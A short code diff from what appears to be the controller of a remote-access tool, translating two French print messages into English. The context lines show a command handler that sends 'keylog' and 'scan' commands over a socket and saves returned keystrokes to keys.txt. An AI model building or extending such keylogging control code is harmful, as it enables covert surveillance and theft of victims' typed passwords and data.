@@ -55,7 +55,7 @@ def send_commands(conn):
 
         elif cmd == 'keylog':
             conn.send(str.encode(cmd))
-            print("Récupération des frappes clavier :\n")
+            print("Getting keys :\n")
             response = conn.recv(4096).decode("utf-8")
             f = open( 'keys.txt', 'a' )
             f.write(response)
@@ -65,7 +65,7 @@ def send_commands(conn):
 
         elif cmd.startswith("scan"):
             conn.send(str.encode(cmd))
-            print("Résultats du scan :\n")
+            print("Scan result :\n")
             response = conn.recv(4096).decode("utf-8")
             print(response)
             continue
